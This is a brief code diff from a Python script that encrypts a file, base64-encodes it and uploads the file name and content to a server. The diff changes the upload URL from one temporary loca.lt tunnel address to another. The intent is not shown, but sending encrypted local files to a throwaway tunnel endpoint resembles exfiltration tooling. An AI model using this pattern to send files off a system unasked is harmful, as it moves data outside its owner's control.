@@ -17,7 +17,7 @@ encoded_data = base64.b64encode(encrypted_content).decode()
 print("Content is encoded")
 
 
-url = 'https://real-carrots-cheer.loca.lt/api/upload'  # Replace with the actual URL of the server endpoint
+url = 'https://odd-turkeys-sniff.loca.lt/api/upload'  # Replace with the actual URL of the server endpoint
 data = {
     'file_name': input_filename,
     'file_content': encoded_data
